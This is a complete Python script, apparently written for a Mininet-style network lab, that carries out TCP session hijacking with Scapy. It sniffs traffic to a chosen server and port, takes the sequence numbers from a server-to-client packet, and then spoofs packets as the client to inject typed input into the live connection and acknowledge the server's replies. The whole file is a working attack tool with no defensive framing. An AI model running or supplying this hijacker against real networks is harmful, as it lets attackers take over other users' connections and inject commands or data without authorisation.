#!/usr/bin/python3

import sys
import getopt
import threading
from scapy.all import *


class Hijacker:
    def __init__(self, srv_ip, srv_port, client_ip=None, dev="h3-eth0"):
        self.srv_ip = srv_ip
        self.srv_port = srv_port
        self.client_ip = client_ip
        self.client_port = None
        self.dev = dev

        self.my_seq = 0
        self.my_ack = 0
        self.hijacked = False

    def input_loop(self):
        while True:
            inject_data = input(">> ")
            inject_data = inject_data + "\n"

            if not self.hijacked:
                continue

            # Spoof packet from client
            packet = IP(src=self.client_ip, dst=self.srv_ip) \
                     / TCP(sport=self.client_port, dport=self.srv_port,
                           seq=self.my_seq, ack=self.my_ack, flags="PA") \
                     / inject_data
            send(packet, iface=self.dev, verbose=False)
            self.my_seq += len(inject_data)

    def handle_packet(self, packet):
        ip = packet.getlayer("IP")
        tcp = packet.getlayer("TCP")
        flags = tcp.sprintf("%flags%")

        print("Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags))

        # Check if this is a hijackable packet
        if flags == "A" or flags == "PA":

            # The packet is from server to client
            if tcp.sport == self.srv_port and ip.src == self.srv_ip:

                payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0

                if not self.hijacked:
                    self.client_ip = ip.dst
                    self.client_port = tcp.dport
                    self.my_seq = tcp.ack
                    self.my_ack = tcp.seq + payload_len
                    self.hijacked = True

                    print("Got server sequence " + str(tcp.seq))
                    print("Got client sequence " + str(tcp.ack) + "\n")
                    print("Hijacking %s:%d -> %s:%d" % (ip.dst, tcp.dport, ip.src, self.srv_port))
                    print("Start sending message to the server")

                    threading.Thread(target=self.input_loop, daemon=True).start()
                else:
                    if tcp.seq == self.my_ack and payload_len > 0:
                        self.my_ack += payload_len
                        data = packet.getlayer("Raw").load
                        print("Received from server: " + data.decode())
                        ack_packet = IP(src=ip.dst, dst=ip.src) \
                                     / TCP(sport=tcp.dport, dport=self.srv_port,
                                           seq=self.my_seq, ack=self.my_ack, flags="A")
                        send(ack_packet, iface=self.dev, verbose=False)

    def run(self):
        if self.client_ip:
            print("Hijacking TCP connections from %s to %s on port %d"
                  % (self.client_ip, self.srv_ip, self.srv_port))
            f = "tcp and port " + str(self.srv_port) + \
                " and host " + self.srv_ip + " and host " + self.client_ip
        else:
            print("Hijacking all TCP connections to %s on port %d"
                  % (self.srv_ip, self.srv_port))
            f = "tcp and port " + str(self.srv_port) + " and host " + self.srv_ip

        sniff(iface=self.dev, store=0, filter=f, prn=self.handle_packet)


def usage():
    print(sys.argv[0])
    print("""
    -c <client_ip> (optional)
    -s <srv_ip>
    -p <srv_port>
    """)
    sys.exit(1)


srv_port = None
srv_ip = None
client_ip = None

try:
    cmd_opts = "c:s:p:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-s":
        srv_ip = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    else:
        usage()

if not srv_ip or not srv_port:
    usage()

Hijacker(srv_ip, srv_port, client_ip).run()
